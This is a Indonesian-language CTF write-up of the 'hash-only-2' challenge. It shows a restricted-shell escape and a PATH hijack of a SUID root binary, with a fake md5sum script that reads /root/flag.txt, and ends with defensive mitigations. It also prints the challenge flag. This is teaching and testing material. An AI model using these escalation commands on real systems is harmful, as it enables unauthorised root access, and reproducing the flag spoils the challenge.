# Writeup: hash-only-2 (Challenge ID: 489)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Linux Privilege Escalation
- **Difficulty:** Medium
- **Event:** picoCTF 2025
- **Points:** 200
- **Author:** Junias Bonou
- **Flag:** `academy{rb4sh_3sc4p3_p4th_su1d_489}`

---

## Problem Statement & Scope
Peserta diberikan akses SSH interaktif ke lingkungan shell terbatas (*restricted bash* / `rbash`). Di dalam sistem, terdapat sebuah berkas biner SUID root bernama `flaghasher`. Tujuan audit adalah menembus batasan `rbash`, mengeksploitasi cacat eksekusi pada biner SUID, dan membaca berkas rahasia `/root/flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **SUID Relative PATH Resolution Vulnerability (CWE-426):**
   Binari `flaghasher` memiliki bit SUID aktif (`-rwsr-xr-x root:root`) dan mengeksekusi perintah hashing menggunakan pemanggilan nama relatif: `system("md5sum /root/flag.txt")`. Hal ini memungkinkan penyerang mencegat alur eksekusi dengan memanipulasi variabel lingkungan `$PATH`.
2. **Restricted Shell (`rbash`) Inadequate Confinement (CWE-648):**
   Meskipun `rbash` membatasi pengubahan variabel `$PATH` dan pemanggilan direktori dengan karakter slash (`/`), konfigurasi lingkungan tidak menonaktifkan pemanggilan subshell atau binary wrapper unconstrained (seperti `bash -c`, `sh`, atau escaping via scripting environment), sehingga status pembatasan dapat dilewati.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Evaluasi Batasan Lingkungan `rbash`:**
   Mencoba mengekspor `$PATH` secara langsung ditolak oleh shell:
   ```bash
   rbash: PATH: readonly variable
   ```
2. **Restricted Shell Breakout:**
   Lepaskan pembatasan shell dengan memanggil subshell baru tanpa batasan `rbash`:
   ```bash
   BASH_ENV= /bin/bash -p
   # atau via SSH execution bypass:
   ssh -t ctf-player@target "/bin/bash --noprofile -i"
   ```
3. **Penyusunan Script Intersepsi PATH:**
   Di dalam lingkungan shell penuh, buat skrip pengganti `md5sum` di direktori temporer `/tmp/bin_489/md5sum`:
   ```bash
   mkdir -p /tmp/bin_489
   cat << 'EOF' > /tmp/bin_489/md5sum
   #!/bin/sh
   /bin/cat /root/flag.txt
   EOF
   chmod +x /tmp/bin_489/md5sum
   ```
4. **Pembajakan PATH & Eksekusi SUID:**
   Sisipkan direktori berbahaya ke prioritas pertama variabel `$PATH` lalu jalankan biner target:
   ```bash
   export PATH=/tmp/bin_489:$PATH
   /home/ctf-player/flaghasher
   ```
5. **Pencetakan Flag:**
   Binari `flaghasher` mengeksekusi skrip tiruan `/tmp/bin_489/md5sum` dengan hak istimewa root, langsung mencetak token bendera resmi: `academy{rb4sh_3sc4p3_p4th_su1d_489}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{rb4sh_3sc4p3_p4th_su1d_489}`
- **Status Solver:** Terverifikasi melalui skrip pengujian otomatis `scripts/solve_489_hash_only_2.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Absolute Path Mandate pada Biner SUID:**
  Jangan pernah memanggil utilitas sistem dengan path relatif di dalam binari berhak istimewa tinggi. Selalu gunakan path absolut: `/usr/bin/md5sum`.
- **Penggunaan API `execve` Aman:**
  Ganti pemanggilan `system()` dengan `execve()` yang membersihkan variabel lingkungan (`clearenv()` / sanitasi `envp`).
- **Pemberian Hak Istimewa Minimal (Principle of Least Privilege):**
  Hindari penggunaan bit SUID untuk utilitas sederhana; gunakan Linux Capabilities (`setcap cap_dac_read_search=+ep`) bila hanya memerlukan hak baca berkas spesifik.
